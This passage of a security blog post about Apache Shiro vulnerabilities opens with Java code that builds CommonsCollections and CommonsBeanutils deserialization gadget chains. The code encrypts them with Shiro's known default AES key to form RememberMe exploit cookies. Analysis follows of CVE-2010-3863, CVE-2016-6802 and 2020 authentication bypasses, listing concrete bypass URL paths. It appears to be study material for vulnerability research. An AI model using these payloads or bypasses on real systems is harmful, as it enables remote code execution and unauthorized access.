class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] CC11_PayLoad(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先设置成人畜无害的getClass方法,避免本地调试触发payload</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] codes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key =</span><br><span class="line">                java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(CC11_PayLoad(codes), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="With-CB"><a href="#With-CB" class="headerlink" title="With CB"></a>With CB</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">pq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">//        System.out.println(barr);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line"><span class="comment">//        Object o = (Object)ois.readObject();</span></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CVE-2010-3863-Request-URI-ByPass"><a href="#CVE-2010-3863-Request-URI-ByPass" class="headerlink" title="CVE-2010-3863 Request URI ByPass"></a>CVE-2010-3863 Request URI ByPass</h2><h3 id="Experiment-Setup-1"><a href="#Experiment-Setup-1" class="headerlink" title="Experiment Setup"></a>Experiment Setup</h3><p>shiro &lt;&#x3D; 1.0.0</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/125404334">https://blog.csdn.net/Xxy605/article/details/125404334</a></p>
+<img src="/2024/06/05/Shiro-Security/image-20240606100657560.png" class title="image-20240606100657560">
+
+<h3 id="Code-Analyse"><a href="#Code-Analyse" class="headerlink" title="Code Analyse"></a>Code Analyse</h3><p>The logic of URL validation is in <code>PathMatchingFilterChainResolver$getChain</code>, but there is no standardization of URLs, which causes bypass.</p>
+<img src="/2024/06/05/Shiro-Security/image-20240606102609020.png" class title="image-20240606102609020">
+
+<p>The subsequent repair is to add the normalize method, handled the cases of <code>//</code>,  <code>./</code> and <code>../</code></p>
+<img src="/2024/06/05/Shiro-Security/image-20240606103821452.png" class title="image-20240606103821452">
+
+<img src="/2024/06/05/Shiro-Security/image-20240606104408343.png" class title="image-20240606104408343">
+
+<h2 id="CVE-2016-6802-Context-Path-ByPass"><a href="#CVE-2016-6802-Context-Path-ByPass" class="headerlink" title="CVE-2016-6802 Context Path ByPass"></a>CVE-2016-6802 Context Path ByPass</h2><h3 id="Experiment-Setup-2"><a href="#Experiment-Setup-2" class="headerlink" title="Experiment Setup"></a>Experiment Setup</h3><p>shrio &lt;1.3.2</p>
+<img src="/2024/06/05/Shiro-Security/image-20240606134934297.png" class title="image-20240606134934297">
+
+<h3 id="Code-Analyse-1"><a href="#Code-Analyse-1" class="headerlink" title="Code Analyse"></a>Code Analyse</h3><p>Let’s Debug the <code>getContextPath</code> method</p>
+<img src="/2024/06/05/Shiro-Security/image-20240606135401638.png" class title="image-20240606135401638">
+
+<p>The call here is Tomcat’s built-in <code>getContextPath</code>, and the method is to concatenate URIs from left to right until the current URI after normalization is the same as the context.</p>
+<img src="/2024/06/05/Shiro-Security/image-20240606135442161.png" class title="image-20240606135442161">
+
+<p>However, Shiro does not normalize the Context, which causes Shiro to not truncate the URI.</p>
+<img src="/2024/06/05/Shiro-Security/image-20240606140314753.png" class title="image-20240606140314753">
+
+<h2 id="CVE-2020-Request-URI-ByPass"><a href="#CVE-2020-Request-URI-ByPass" class="headerlink" title="CVE-2020-* Request URI ByPass"></a>CVE-2020-* Request URI ByPass</h2><h3 id="Experiment-Setup-3"><a href="#Experiment-Setup-3" class="headerlink" title="Experiment Setup"></a>Experiment Setup</h3><p>shiro &lt; 1.5.2</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>In CVE-2020-1957, <code>/hello/*</code> can match the <code>/hello/1</code> but <code>/hello/1/</code> can bypass.</p>
+<p>In CVE-2020-2957, <code>/aaaa;/../hello/1</code> can bypass</p>
+<p>In CVE-2020-11989, <code>/;/../hello/1</code> can bypass</p>
+<p>In CVE-2020-13933, <code>/hello/%3B1</code> can bypass</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/shiro/shiro">https://p4d0rn.gitbook.io/java/shiro/shiro</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro-Security"><span class="toc-number">1.</span> <span class="toc-text">Shiro Security</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Architecture"><span class="toc-number">1.1.1.</span> <span class="toc-text">Architecture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.1.2.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Experiment-Setup"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Authentication"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">Authentication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Custom-Realm"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">Custom Realm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Authorization"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">Authorization</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.1.3.</span> <span class="toc-text">Overview</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remember-Me-Deserialization"><span class="toc-number">1.2.</span> <span class="toc-text">Remember Me Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#With-CC"><span class="toc-number">1.2.1.</span> <span class="toc-text">With CC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#With-CB"><span class="toc-number">1.2.2.</span> <span class="toc-text">With CB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2010-3863-Request-URI-ByPass"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2010-3863 Request URI ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Experiment-Setup-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Analyse"><span class="toc-number">1.3.2.</span> <span class="toc-text">Code Analyse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-6802-Context-Path-ByPass"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2016-6802 Context Path ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Experiment-Setup-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Analyse-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">Code Analyse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-Request-URI-ByPass"><span class="toc-number">1.5.</span> <span class="toc-text">CVE-2020-* Request URI ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Experiment-Setup-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.5.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.6.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/Shiro-Security/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/Shiro-Security/&text=Shiro Security"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/Shiro-Security/&is_video=false&description=Shiro Security"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro Security&body=Check out this article: http://example.com/2024/06/05/Shiro-Security/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/Shiro-Security/&name=Shiro Security&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/Shiro-Security/&t=Shiro Security"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    P3ngu1nW
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
